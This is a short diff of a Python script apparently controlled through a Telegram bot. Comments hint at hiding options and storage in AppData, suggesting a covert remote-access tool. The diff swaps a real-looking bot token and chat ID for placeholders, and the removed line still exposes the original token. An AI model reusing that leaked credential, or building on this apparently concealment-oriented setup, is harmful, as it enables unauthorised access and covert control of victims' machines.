@@ -35,11 +35,11 @@ from ctypes import * #fixing pyinstaller - we need to import all the ctypes to g
 me = singleton.SingleInstance()
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
 #token = 'nnnnnnnnn:lllllllllllllllllllllllllllllllllll'
-token = '665355978:AAFjGAzwDccWzL2yJc9WJm7EQQXYxFYsqL0' # you can set your environment variable as well
+token = 'xx:xxx' # you can set your environment variable as well
 # This will be used for setting paths and related file io -- change to whatever you want
-app_name = 'speedyb3'
+app_name = 'xx'
 # ADD YOUR chat_id TO THE LIST BELOW IF YOU WANT YOUR BOT TO ONLY RESPOND TO ONE PERSON!
-known_ids = ['543537120']
+known_ids = ['123']
 #known_ids.append(os.environ['TELEGRAM_CHAT_ID']if 'TELEGRAM_CHAT_ID' in os.environ) 		# make sure to remove this line if you don't have this environment variable
 appdata_roaming_folder = os.environ['APPDATA']			# = 'C:\Users\Username\AppData\Roaming'
 														# HIDING OPTIONS
